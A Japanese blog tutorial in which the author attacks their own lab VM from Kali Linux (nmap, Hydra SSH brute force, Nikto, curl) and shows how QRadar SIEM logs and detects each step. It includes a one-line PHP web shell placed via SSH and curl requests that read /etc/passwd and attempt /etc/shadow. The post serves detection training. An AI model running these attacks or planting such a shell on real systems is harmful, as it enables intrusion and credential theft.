---
title: "【QRadar × Kali Linux】サイバー攻撃の検知方法"
date: 2026-05-05
tags: ["countermeasure", "Security", "KaliLinux", "SIEM", "QRadar"]
source: "https://qiita.com/ohtsuka-shota/items/29c395ac8776a25515a2"
---
:::note alert
必ず自分の管轄下のサーバ等に対して行う事。
管轄外のサーバ等に許可なく行う事は、サイバー犯罪に該当してしまう可能性があります。
:::

今までQRadar並びにSIEMの勉強をしてきましたが、もう少し拡張していきたいと思います。より攻撃っぽくするために実際の攻撃の流れに沿って偵察⇒侵入⇒脆弱性調査⇒情報奪取をKali Linuxを使って試してみます。

# 環境イメージ
Kali Linuxでnmapを使って、攻撃対象のポートで何が開いているかを確認。
その後、HydraやNiktoを使って開いているポート（今回はSSH、HTTP）を対象に、ログインが出来るか、どのような脆弱性があるかを確認。
最後に権限昇格の思考としてcurlを使って情報奪取をするという事をしてみます。
そしてそれぞれの実行ログをQRadarで確認してみます。
![security01-ページ-5.drawio (1).png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/f9d816f7-51cc-4b8f-b10b-158c7914b3ff.png)



# 用語
## nmap
攻撃の第一段階である「偵察」として、ターゲットの開いているポートを調査する手法です。QRadarでは、UFW（ファイアウォール）が拒否した大量の「[UFW BLOCK]」ログとして記録され、短時間に多くのポートを叩く不審な動きとして検知されます。

https://www.kali.org/tools/nmap/

## Hydra（ヒドラ）
SSHなどのログイン画面に対し、辞書ファイルを用いて高速にパスワード総当たりを試みる手法です。
QRadarには「Failed password」という認証失敗ログが短時間に猛烈な勢いで届くため、単なる入力ミスではない「乗っ取りの試み」として高い優先度で検知されます。

https://www.kali.org/tools/hydra/

## Nikto（ニクト）
Webサーバーに対し、設定不備や脆弱なファイル（管理画面や古いスクリプト）がないか自動調査する手法です。
QRadarではApacheのアクセスログとして記録され、存在しないファイルへの大量の「404 Not Found」や、ペイロードに含まれる攻撃的な文字列（/etc/passwd等）が検知の対象となります。

https://www.kali.org/tools/nikto/

# 検証
## 攻撃対象の準備
ProxmoxのLXCでは一部の動作が上手くいかなかったので、VMを新規で立ち上げます。
VMを立ち上げたら、apt update と apt upgradeをして、パッケージを最新化しておきます。

次にiptablesとapache,phpをインストールしてWebサーバ化しておきます。
まずwebサーバ化しておきます。
```
root@ohtsuka-qradar-target01:~# apt install -y apache2
root@ohtsuka-qradar-target01:~# systemctl enable apache2
root@ohtsuka-qradar-target01:~# systemctl start apache2
```

Webブラウザでアクセスできることを確認します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/9d56c1b9-76db-4af5-b586-c9d899f74b66.png)

次にiptablesがインストールされていることを確認します。
```
root@ohtsuka-qradar-target02:~# iptables -V
iptables v1.8.10 (nf_tables)
```

ufwを有効化してログを出力する設定を入れておきます。
```
root@ohtsuka-qradar-target02:~# ufw enable
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
root@ohtsuka-qradar-target02:~# ufw allow 22/tcp
Rule added
Rule added (v6)
root@ohtsuka-qradar-target02:~# ufw allow 80/tcp
Rule added
Rule added (v6)
root@ohtsuka-qradar-target02:~# ufw status
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
22/tcp (v6)                ALLOW       Anywhere (v6)
80/tcp (v6)                ALLOW       Anywhere (v6)
root@ohtsuka-qradar-target02:~# ufw logging medium
Logging enabled
```

同様にqradar.confに修正を行います。
IPアドレスはQRadarのホストのものを記載します。
```
root@ohtsuka-qradar-target01:~# nano /etc/rsyslog.d/qradar.conf
root@ohtsuka-qradar-target02:~# cat /etc/rsyslog.d/qradar.conf
# Use traditional syslog format
$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

# Forward generic system logs
user.*      @172.18.250.163:514
daemon.*    @172.18.250.163:514
syslog.*    @172.18.250.163:514

# Forward authentication logs (includes SSH / sudo related logs)
auth.*      @172.18.250.163:514
authpriv.*  @172.18.250.163:514

# Load imfile module to monitor text files
module(load="imfile")

# Apache Access Log
input(type="imfile"
      File="/var/log/apache2/access.log"
      Tag="apache-access:"
      Severity="info"
      Facility="local6")

# Forward local6 (Apache logs) to QRadar
local6.*      @172.18.250.163:514

# Forward Firewall (ufw) logs
kern.*        @172.18.250.163:514
```

PHPをインストールしていきます。
```
root@ohtsuka-qradar-target02:~# apt install -y php libapache2-mod-php
```

## 攻撃
### 【偵察】ネットワークスキャン（Nmap）
以下のコマンドをKali上で実行します。
- -sS: ステルススキャン（TCP SYNスキャン）
- -Pn: 相手がPingに応答しなくてもスキャンを実行

スキャンが完了すると、レポートが出力されます。
対象ホストが起動していることやマックアドレスなどが表示されていますね。
PortもUFWで許可しているものだけが出力されていることがわかります。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# nmap -sS -Pn 172.18.250.18   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-04 21:30 +0900
Nmap scan report for 172.18.250.18
Host is up (0.00067s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: BC:24:11:3E:98:72 (Proxmox Server Solutions GmbH)

Nmap done: 1 IP address (1 host up) scanned in 5.63 seconds
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/c10a9959-f04f-4ac8-ba0f-7dc7baa0e78d.png)

QRadarにアクセスします。ログ・アクティビティータブを開きます。
パラメータ：ペイロードに含まれる
演算子：次である
値：UFW BLOCK
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/6d1d78f9-6fc1-416c-a549-5640cb197cac.png)

出力されます。一番上の行をダブルクリックして詳細を確認します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/b03ea9ef-356f-4eb0-90b4-1d809567e199.png)

UFW BLOCKの詳細を確認できます。
![screencapture-172-18-250-163-console-qradar-jsp-QRadar-jsp-2026-05-04-20_08_03.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/87c7cbb4-ccf6-4581-8f2f-3461826434e8.png)

### 【侵入】ブルートフォース攻撃の自動化（Hydra）
Hydraを使ってSSHへのブルートフォースを仕掛けます。
Kali Linuxの/usr/share/wordlist/fasttrack.txtを見るとパスワード候補のリストファイルがあることがわかります。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/3f22cd6f-a3f3-404d-b454-3c71c8bcd47a.png)

KaliでTerminalを開いて、以下のコマンドを実行します。
testユーザでパスワード候補はfasttrack.txtのものを使用するという内容です。
脆弱なパスワードにしていたので、test/passwordでログイン出来るという事がばれてますね。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# hydra -l test -P /usr/share/wordlists/fasttrack.txt ssh://172.18.250.18 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 21:27:48
[DATA] max 4 tasks per 1 server, overall 4 tasks, 262 login tries (l:1/p:262), ~66 tries per task
[DATA] attacking ssh://172.18.250.18:22/
[STATUS] 69.00 tries/min, 69 tries in 00:01h, 193 to do in 00:03h, 4 active
[22][ssh] host: 172.18.250.18   login: test   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 21:29:19
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/9e813855-6c75-449e-9e7c-2b9596be645c.png)

QRadarでログを確認してみます。
パラメータ：ペイロードに含まれる
演算子：次である
値：failed password
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/5213b4bc-56fb-45bf-b919-7d00d34ddf4f.png)

イベント数を見ると、それなりに数があることがわかると思います。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/4e8e45ac-3315-4099-a6bc-ad509594c27a.png)

詳細を見てみます。
![screencapture-172-18-250-163-console-qradar-jsp-QRadar-jsp-2026-05-04-20_22_07.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/3b643233-0af9-4e3a-a4ec-122ef01f1d27.png)

オフェンスにも出力があります。
今回は172.18.250.18の方になります。Hydraでのパスワードクラックが1つの攻撃として収集されていることが、ここに表記されていることからわかります。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/a15d286d-4c1d-4077-b529-6dd3bd274aaa.png)

詳細は以下となります。
![QRadar - Offense Manager02-1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/91fd29fb-a940-4033-ad8f-9c9f998e7ddf.png)
![QRadar - Offense Manager02-2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/04b7be0e-ca97-4885-a8e2-8d3df0958557.png)
![QRadar - Offense Manager02-3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/fc4ebc69-4636-48d2-a1f7-a2799def68fc.png)

### 【脆弱性調査】Web脆弱性スキャン（Nikto）
Kaliで以下のコマンドを実行します。
ターゲット（172.18.250.18）のWebサーバーに対して 8,083回ものリクエストを送り、設定の不備や古いソフトウェアの脆弱性を調査した結果になります。"Suggested security header missing: content-security-policy"等という記載からXSS等を防ぐ設定がされてないこと、実行できるHTTPメソッドなどがわかります。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# nikto -h http://172.18.250.18
- Nikto v2.6.0
---------------------------------------------------------------------------
+ Your Nikto installation is out of date.
+ Target IP:          172.18.250.18
+ Target Hostname:    172.18.250.18
+ Target Port:        80
+ Platform:           Linux/Unix
+ Start Time:         2026-05-04 21:18:45 (GMT9)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [999984] /: Server may leak inodes via ETags, header found with file /, inode: 29af, size: 650fb6368d404, mtime: gzip. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [600050] Apache/2.4.58 appears to be outdated (current is at least 2.4.66).
+ [999990] OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
+ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 8083 requests: 16 errors and 10 items reported on the remote host
+ End Time:           2026-05-04 21:24:24 (GMT9) (339 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/8a1084fd-e020-49ca-a4a4-127166b07083.png)


QRadarで確認します。
パラメータ：ペイロードに含まれる
演算子：次である
値：apache-access
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/5e0fafb2-3341-407d-82c6-adfbe84f3ff2.png)

沢山のアクセスログが出力されていることがわかります。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/4d486d49-4601-4761-b285-e5a8d437b8dc.png)

オフェンスについては、apache-accessのものが無かったです。
~~この辺りはチューニングしてQRadarに攻撃だと教える必要があるっぽいです。これは今後勉強してみます。~~

勉強してみまたした。
独自ルールを作ってオフェンスを発生させる手順です。

[[qradar-nikto-scan-detection]]

### 【情報奪取】情報奪取の試行 (Exploit)

一旦失敗してみます。curlコマンドで以下を実行します。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# curl "http://172.18.250.18/index.php?exec=cat+/etc/shadow"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 172.18.250.18 Port 80</address>
</body></html>
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/c4bc8efa-608f-4725-9f90-d8b6dd337a6e.png)


QRadarで検索をかけてみます。
パラメータ：ペイロードに含まれる
演算子：次である
値：cat+/etc/shadow
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/ac8c34b3-cb07-48de-9584-9aef4d839f54.png)

一件引っ掛かってきます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/187dcef0-c6bb-467d-87c9-456d638f4204.png)

中身を見てみます。"<182>May  4 12:53:39 ohtsuka-qradar-target02 apache-access: 172.18.251.68 - - [04/May/2026:12:53:39 +0000] "GET /index.php?exec=cat+/etc/shadow HTTP/1.1" 404 436 "-" "curl/8.19.0""というログが出ています。404ではじかれていることがわかります。
![screencapture-172-18-250-163-console-qradar-jsp-QRadar-jsp-2026-05-04-21_54_59.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/b53ff6f3-4840-4252-bb50-0b49cdd4386b.png)

### 【情報奪取】リモートコードエグゼキューション (Remote Code Execution,RCE)
先程は失敗しましたが、それはindex.phpというファイルを置いていなかったのが原因です。今回はSSH接続用のユーザ（test/password）という事を攻撃者はHydraの攻撃により把握しているので、そのユーザを使って攻撃用のindex.phpを置いてそれをcurlコマンドからキックして/etc/passwdの情報を奪取してみたいと思います。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# ssh test@172.18.250.18                                                
test@172.18.250.18's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May  4 01:54:22 PM UTC 2026

  System load:            0.0
  Usage of /:             39.5% of 14.66GB
  Memory usage:           11%
  Swap usage:             0%
  Processes:              122
  Users logged in:        1
  IPv4 address for ens18: 172.18.250.18
  IPv6 address for ens18: fd34:c6bb:656f:de65:be24:11ff:fe3e:9872

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***
Last login: Mon May  4 13:45:04 2026 from 172.18.251.68
test@ohtsuka-qradar-target02:~$ sudo nano /var/www/html/index.php
[sudo] password for test: 
test@ohtsuka-qradar-target02:~$ sudo cat /var/www/html/index.php
<?php
if(isset($_GET['cmd'])) {
    echo "Command output:\n";
    system($_GET['cmd']);
}
?>
test@ohtsuka-qradar-target02:~$ sudo chmod 644 /var/www/html/index.php
test@ohtsuka-qradar-target02:~$ sudo chown www-data:www-data /var/www/html/index.php
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/8d30f997-cfb6-41a9-84cd-fc46962e9fdc.png)


実際にcurlを使ってキックしていきます。
なんと、遠隔で/etc/passwdの情報を取得できてしまいました。
他にどんなユーザがいるのか、攻撃者に漏れてしまいました。
```
┌──(root㉿ohtsuka-kali)-[~]
└─# curl "http://172.18.250.18/index.php?cmd=cat+/etc/passwd"
Command output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
test:x:1000:1000:test:/home/test:/bin/bash
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/efdc67ea-435a-4e6b-85d9-560942578acd.png)

QRadarでも確認できます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/2b955715-e5fc-4530-87b5-af81ec9d118c.png)
![screencapture-172-18-250-163-console-qradar-jsp-QRadar-jsp-2026-05-04-23_27_57.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/c3f847fe-d60c-4530-b470-81937396f83e.png)

